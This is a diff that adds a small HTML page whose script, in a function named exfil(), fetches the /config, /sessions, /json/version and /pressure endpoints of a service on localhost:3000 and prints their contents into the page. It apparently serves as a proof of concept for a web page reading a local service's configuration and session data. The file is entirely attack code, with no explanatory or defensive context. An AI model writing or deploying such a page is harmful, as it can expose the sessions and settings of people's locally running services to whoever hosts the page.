@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html><body>
+<pre id="out">Loading...</pre>
+<script>
+async function exfil() {
+  const targets = [
+    'http://localhost:3000/config',
+    'http://localhost:3000/sessions', 
+    'http://localhost:3000/json/version',
+    'http://localhost:3000/pressure'
+  ];
+  let results = '';
+  for (const url of targets) {
+    try {
+      const resp = await fetch(url);
+      const text = await resp.text();
+      results += `\n=== ${url} ===\n${text}\n`;
+    } catch(e) {
+      results += `\n=== ${url} === ERROR: ${e.message}\n`;
+    }
+  }
+  document.getElementById('out').textContent = results;
+}
+exfil();
+</script>
+</body></html>
